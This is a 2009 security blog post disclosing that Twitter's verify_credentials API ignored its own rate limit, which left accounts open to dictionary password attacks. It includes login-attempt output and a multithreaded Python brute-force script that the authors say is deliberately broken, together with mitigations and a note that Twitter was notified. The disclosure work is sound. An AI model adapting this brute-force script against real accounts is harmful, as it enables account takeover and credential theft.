---
title: Breaking Twitter (Authenication)
date: "2009-08-25"
categories: 
  - security
tags: 
  - security
  - twitter
  - authenication 
  - python 
  - migrated
series:
  - "Praetorian Prefect"
aliases:
  - /breaking-twitter-authenication.html
slug: breaking-twitter-authenication
author: Jeremy Rossi
description: |
    Yesterday we spent some time speculating on how phishing attacks like
    the one afflicting Twitter on Wednesday of this week are seeded. How are
    the original direct messages sent out that kick off the first stolen
    credentials, the next set of direct messages, and so on in the loop? We
    were hoping, but not counting on, the fact that Twitter might address
    this in their blog. Taking a page from Google or Microsoft, an up front
    and transparent approach to security seems to be the direction of
    major players in the online space. Twitter may consider embracing this
    approach, given its rampant rise in popularity and thus existence at the
    edge of malicious customized attacks from bad actors, as it likely has a
    lot of data that would benefit the information assurance community.
---



Yesterday we spent some time speculating on how phishing attacks like
the one afflicting Twitter on Wednesday of this week are seeded. How are
the original direct messages sent out that kick off the first stolen
credentials, the next set of direct messages, and so on in the loop? We
were hoping, but not counting on, the fact that Twitter might address
this in their blog. Taking a page from Google or Microsoft, an up front
and transparent approach to security seems to be the direction of
major players in the online space. Twitter may consider embracing this
approach, given its rampant rise in popularity and thus existence at the
edge of malicious customized attacks from bad actors, as it likely has a
lot of data that would benefit the information assurance community.

[In our rampant speculating](http://praetorianprefect.com/archives/2009/09/rofl-this-you -on-here-the-latest-twitter-worm/) 
(guessing), we noted that we thought
brute force password attacks would move away from the main Twitter
login page because of their implementation of CAPTCHA (showing an
image that is easy for a human to translate and type in but difficult
for a computer to identify), which occurs after several failed login
attempts. While some success has been reported by both researchers
attempting to break CAPTCHA, as well as researchers 
[watching others break it](http://securitylabs.websense.com/content/Blogs/2919.aspx),
the processing time of dealing with translating thousands of
CAPTCHA messages becomes problematic from a password cracking
standpoint (as far as we know, if you have a counter example
please show us). So where does one go to perform the type of
brute force password attack that a [teenage hacker used in January](http://www.wired.com/threatlevel/2009/01/professed-twitt/) to
gain access to [Crystal the Twitter admin's](http://twitter.com/crystal)
account, achieve 'Happiness' and allow others to tweet on behalf of
Barack Obama and Britney Spears?

<div class="panel panel-default .col-md-6" >
  <div class="panel-body">

<a href="http://praetorianprefect.com/wp-content/uploads/2009/09/obama-twitter-hacked.jpg"><img src="http://praetorianprefect.com/wp-content/uploads/2009/09/obama-twitter-hacked.jpg" alt="Back in January the @BarackObama account was broken into." title="obama-twitter-hacked" width="500" height="327" class="size-full wp-image-576" /></a>

<br>

Back in January the @BarackObama account was broken into.
  </div>
</div>

We thought that the Twitter API (application program interface) is
the next place to go. While moving towards OAuth authentication (a
mechanism by which users can provide others access to their data
without providing their authentication credentials) the old style
API calls with user name and password are still available. Providing
an API is one of the primary reasons for Twitter's popularity, as
many tools can provide both interfaces into the online services
of Twitter, as well as act as aggregators for the data within
Twitter's data stores. In fact, for most tweeple, the actual system
confines of Twitter might as well be a big database, as they are
doing their tweeting through [TweetDeck](http://tweetdeck.com/) or
[Tweetie](http://www.atebits.com/tweetie-iphone/), monitoring topics
at [TwitterFall](http://twitterfall.com/), looking at their favorite
famous twits at [Congressional140](http://www.congressional140.com)
or [CelebrityTweet](http://www.celebritytweet.com/), mapping the
world's tweets with [TwitterVision](http://beta.twittervision.com/), or
evaluating themselves with [CurseBird](http://www.cursebird.com/).

That same API provides an alternate path for logging into
Twitter, and provides all the functionality available through
the web application (authentication, reading tweets, tweeting).
You can read more about the overall Twitter API here:
[http://apiwiki.twitter.com](http://apiwiki.twitter.com).

But wait you say, are you trying to tell us that brute force password
attacks will move to the API when I just read on the Twitter API wiki
that the API severely limits the rate of calls you are allowed to make
to it (200/hour/IP for authenticated requests without whitelisting)?
That should be a mitigating control. Should be, but isn't, because it is
not enforced on all of the API calls.

### Rate Limit? We don't need no stinking rate limit. ###

From the twitter API documenation on
[account/verify_credentials](http://apiwiki.twitter.com/Twitter-REST-API-Method%3A-account%C2%A0verify_credentials) 
Twitter states:

_Returns an HTTP 200 OK response code and a representation of the
requesting user if authentication was successful; returns a 401 status
code and an error message if not. Use this method to test if supplied
user credentials are valid. Because this method can be a vector for a
brute force dictionary attack to determine a user's password, it is
limited to *15 requests per 60 minute period* (starting from your first
request)._

Well, let's see. Using a simple python program that tried known
incorrect passwords as fast as the the API would respond (but well below
DOS thresholds), we have this:

```bash

[~]% time python twitterauthcheck.py
Login: _eeeeeeeek Password: 0 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: 1 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: 2 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: 3 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: 4 failed: HTTP Error 401: Unauthorized

[......SNIP......]

Login: _eeeeeeeek Password: 295 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: 296 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: 297 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: 298 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: 299 failed: HTTP Error 401: Unauthorized
Login: _eeeeeeeek Password: <redacted> accepted
/opt/local/bin/python2.6 testingauth.py  2.03s user 1.47s system 1% cpu 4:25.05 total
```

So looking at the details we have 300 passwords attempted in 2 minutes
and 3 seconds. We can also see on the 300th attempt the password was
accepted (we put the correct password in at number 300) so we can
conclude that the account is not getting locked out due to enforcement
of rate limits. So next we ran the script six times concurrently (3,600
attempts). Still not locked out.

We are also showing that we are able to blow through the overall 150
request limit per IP per hour that Twitter reports is the rate limit.
Running multiple attempts did start to hit some 503 Bad Gateway errors
which we thought might be the end of the road, but no, it started
responding again a second later.

Running the script is slow. Twitter's greatest defense here against
a true brute force attack using a single thread is that it takes a
while for their infrastructure to respond. We can call that security
through lack of capacity. Since a good password cracker takes more then
a few hundred entries to work ([this LOphtCrack dictionary has 235,007 entries.](http://praetorianprefect.com/wp-content/uploads/2009/09/dic.tx t)), 
we'll go multi-threaded.

In a final controlled example, we use a known account where one person
sets a dictionary word simple password and the other person runs the
script without specifically knowing the password (just in case someone
wants to write a Computer Fraud and Abuse Act essay in the comments,
when someone logs into their own account its called authentication).
Again, low request threshold, and only accessing our own account.

25,086 attempts thus far before we got bored watching it, so a little
over 7 hours and the whole 200,000+ dictionary word list would be done,
and likely any account using a common dictionary based password would
be accessed. We tried a few subsequent runs that mixed in a correct
password just to ensure everything was working, and the program notified
us of the successful login.

If Twitter wants to minimize the probability of success for this
vulnerability it could:

- Enforce its stated rate limits.
- Start requiring minimally complex passwords.
- Complete the migration to OAuth.

As we like Twitter as much as the next, and because we are in favor of
good faith disclosure, we have notified them of our concerns. _Update_:
A Twitter representative has responded that the information provided has
been sent on to the right internal team at Twitter.

Here's the Code: <a href="http://praetorianprefect.com/wp-content/uploads/2009/09/threadedtwitter.py.txt" title="threadedtwitter.py">threadedtwitter.py</a>
<br>
Dictionary: <a href="http://praetorianprefect.com/wp-content/uploads/2009/09/dic.txt" title="dic.txt">dic.txt</a>

_Please note, the code is provided for demonstration purposes only, should not be run ever, and contains intentional errors so that attempts to run it will not work._

The command is as follows: `twitterauthcheck.py username passwordlist.txt`

```python
import threading,Queue
import socket
import tweethon
import urllib2
import socket
import sys

class Threader:
    # Class taken from: Sept 3 2004, Justin A: http://code.activestate.com/recipes/302746/
    def __init__(self, numthreads):
        self._numthreads=numthreads

    def get_data(self,):
        raise NotImplementedError, "You must implement get_data as a function that returns an iterable"
        return range(10000)
    def handle_data(self,data):
        raise NotImplementedError, "You must implement handle_data as a function that returns anything"
        time.sleep(random.randrange(1,5))
        return data*data
    def handle_result(self, data, result):
        raise NotImplementedError, "You must implement handle_result as a function that does anything"
        print data, result

    def _handle_data(self):
        while 1:
            x=self.Q.get()
            if x is None:
                break
            self.DQ.put((x,self.handle_data(x)))

    def _handle_result(self):
        while 1:
            x,xa=self.DQ.get()
            if x is None:
                break
            self.handle_result(x, xa)

    def run(self):
        if hasattr(self, "prerun"):
            self.prerun()
        self.Q=Queue.Queue()
        self.DQ=Queue.Queue()
        ts=[]
        for x in range(self._numthreads):
            t=threading.Thread(target=self._handle_data)
            t.start()
            ts.append(t)

        at=threading.Thread(target=self._handle_result)
        at.start()

        try :
            for x in self.get_data():
                self.Q.put(x)
        except NotImplementedError, e:
            print e
        for x in range(self._numthreads):
            self.Q.put(None)
        for t in ts:
            t.join()
        self.DQ.put((None,None))
        at.join()
        if hasattr(self, "postrun"):
            return self.postrun()
        return None


class twitterpasswordtester(Threader):

    def get_data(self):
        data = open(sys.argv[2]).read()
        data = data.split('\n')
        self._usename = sys.argv[1]
        self.counter = 0
        return data

    def handle_data(self,p):
        print "in testAuth"
        u = self._usename
        x = tweethon.Api(username=u, password=p)
        x.SetCache(None)
        try:
            x.VerifyCredentials()
            results = "login: {0} Password: {1} accepted\n".format(u, p)
        except urllib2.HTTPError, e:
            results = "login: {0} Password: {1} failed: {2}\n".format(u, p, e)
        finally:
            del x
            return results

    def handle_result(self, data, result):
        print result
        print self.counter 
        self.counter += 1
        self.res.append((data,result))
    def prerun(self):
        self.res=[]
    def postrun(self):
        return self.res


z = twitterpasswordtester(10)
for n,ns in  a.run():
    print n,ns
```

Tweethon Source: [http://bitbucket.org/jrossi/tweethon/src/tip/README](http://bitbucket.org/jrossi/tweethon/src/tip/README)

*The Tweethon library, the only custom or uncommon library above, is intended to make the [Twitter web services API](http://twitter.com/help/api) easier for python programmers to use.*

 
